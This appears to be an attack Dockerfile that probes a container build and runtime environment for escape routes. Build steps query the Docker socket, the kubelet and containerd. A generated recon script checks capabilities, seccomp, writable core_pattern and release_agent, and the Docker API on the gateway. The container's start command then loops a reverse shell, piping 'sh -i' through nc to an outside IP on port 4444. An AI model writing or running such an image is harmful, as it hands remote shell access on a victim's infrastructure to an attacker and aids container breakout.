# syntax=docker/dockerfile:1
FROM alpine:3.18

# --- BUILD-TIME: test --network=host entitlement ---
# If network.host is allowed, this RUN gets the host network namespace.
# We scan for Docker socket, kubelet, and other host-only services.
RUN --network=host \
    apk add --no-cache curl && \
    echo "=== BUILD NETWORK HOST TEST ===" > /build_net_result && \
    hostname >> /build_net_result 2>&1 && \
    ip addr >> /build_net_result 2>&1 && \
    # Docker socket
    (curl -s --unix-socket /var/run/docker.sock http://localhost/info >> /build_net_result 2>&1 || echo "docker sock: unavail" >> /build_net_result) && \
    # Kubelet localhost
    (curl -sk https://127.0.0.1:10250/pods >> /build_net_result 2>&1 || echo "kubelet: unavail" >> /build_net_result) && \
    # Containerd
    (ls -la /run/containerd/containerd.sock >> /build_net_result 2>&1 || echo "containerd sock: unavail" >> /build_net_result) && \
    echo "=== END ===" >> /build_net_result

# --- RUNTIME: install recon tools + reverse shell ---
RUN apk add --no-cache gcc musl-dev linux-headers bash libcap util-linux attr

# Pre-compiled recon script
RUN echo '#!/bin/sh' > /recon.sh && \
    echo 'echo "=== RUNTIME ESCAPE RECON ==="' >> /recon.sh && \
    echo 'echo "---KERNEL---"' >> /recon.sh && \
    echo 'uname -r' >> /recon.sh && \
    echo 'echo "---HOSTNAME---"' >> /recon.sh && \
    echo 'hostname' >> /recon.sh && \
    echo 'echo "---CAPS---"' >> /recon.sh && \
    echo 'grep Cap /proc/self/status' >> /recon.sh && \
    echo 'echo "---SECCOMP---"' >> /recon.sh && \
    echo 'grep Seccomp /proc/self/status' >> /recon.sh && \
    echo 'echo "---CLONE_NEWUSER---"' >> /recon.sh && \
    echo 'unshare --user -- id 2>&1' >> /recon.sh && \
    echo 'echo "---MOUNT_TEST---"' >> /recon.sh && \
    echo 'unshare --mount -- id 2>&1' >> /recon.sh && \
    echo 'echo "---DOCKER_SOCK---"' >> /recon.sh && \
    echo 'ls -la /var/run/docker.sock /run/docker.sock 2>&1' >> /recon.sh && \
    echo 'echo "---DOCKER_GW---"' >> /recon.sh && \
    echo 'ip route 2>/dev/null | head -3' >> /recon.sh && \
    echo 'GW=$(ip route | grep default | awk "{print \$3}")' >> /recon.sh && \
    echo 'echo "Gateway: $GW"' >> /recon.sh && \
    echo 'wget -q -T2 -O- http://$GW:2375/info 2>&1 | head -5' >> /recon.sh && \
    echo 'wget -q -T2 -O- http://$GW:2376/info 2>&1 | head -5' >> /recon.sh && \
    echo 'echo "---CORE_PATTERN---"' >> /recon.sh && \
    echo 'cat /proc/sys/kernel/core_pattern 2>/dev/null' >> /recon.sh && \
    echo 'echo "---MODPROBE---"' >> /recon.sh && \
    echo 'cat /proc/sys/kernel/modprobe 2>/dev/null' >> /recon.sh && \
    echo 'echo "---WRITABLE_PROC---"' >> /recon.sh && \
    echo 'find /proc/sys -writable 2>/dev/null | head -10' >> /recon.sh && \
    echo 'echo "---RELEASE_AGENT---"' >> /recon.sh && \
    echo 'find /sys/fs/cgroup -name release_agent -writable 2>/dev/null' >> /recon.sh && \
    echo 'echo "---MOUNTS---"' >> /recon.sh && \
    echo 'cat /proc/self/mountinfo | head -20' >> /recon.sh && \
    echo 'echo "---GROUPS---"' >> /recon.sh && \
    echo 'id' >> /recon.sh && \
    echo 'echo "---BUILD_NET_RESULT---"' >> /recon.sh && \
    echo 'cat /build_net_result 2>/dev/null' >> /recon.sh && \
    echo 'echo "=== END RECON ==="' >> /recon.sh && \
    chmod +x /recon.sh

CMD sh -c "/recon.sh; while true; do sh -i 2>&1 | nc 129.101.121.138 4444; sleep 5; done"
